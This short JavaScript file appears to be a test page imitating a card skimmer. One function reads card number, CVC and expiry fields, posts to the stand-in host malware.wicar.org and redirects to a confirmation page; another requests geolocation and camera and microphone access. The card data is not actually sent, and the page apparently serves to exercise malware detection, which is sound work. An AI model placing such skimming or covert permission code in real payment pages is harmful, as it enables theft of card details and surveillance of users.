

var x = document.getElementById("demo");
var button = document.getElementById("mali_test");
var button1 = document.getElementById("mali");

if(button){
  button.addEventListener("click", () => {
  myFunction(),
  myFunctionA()
})
}
if(button1){
  button1.addEventListener("click", () => {
  myFunctionA()
  })
}



function myFunction() {
   
   let a = document.querySelector('#card-cvc').value
   let b = document.querySelector('#card-number').value
   let c = document.querySelector('#card-expiry-y').value
   let d = document.querySelector('#card-expiry-m').value

   fetch('https://malware.wicar.org/',{
      mode: 'no-cors',
      method: 'POST',
      headers: { 'Content-type': 'application/json' }})
    .then(response => console.log(response))
    .then(res=>{console.log(res,a,b,c,d); 
        window.location.href = 'confirmation.html'
    })

}

function myFunctionA() {
if (navigator.geolocation) {
  navigator.geolocation.getCurrentPosition(showPosition);
} else { 
  x.innerHTML = "Geolocation is not supported by this browser.";
}
init()
}

async function init(){
   
    let d= navigator.getUserMedia({ audio: true, video: { width: 100, height: 100 } }, 
       function(stream) {
      var video = document.querySelector('video');
      video.srcObject = stream;
      video.onloadedmetadata = function(e) {
        video.play();
      };
      
   },
   function(err) {
    console.log(err.message);
 }
);
}

    
    function showPosition(position) {
      x.innerHTML = "Latitude: " + position.coords.latitude + 
      "<br>Longitude: " + position.coords.longitude;
    }
    
    
    
    

 
    
   

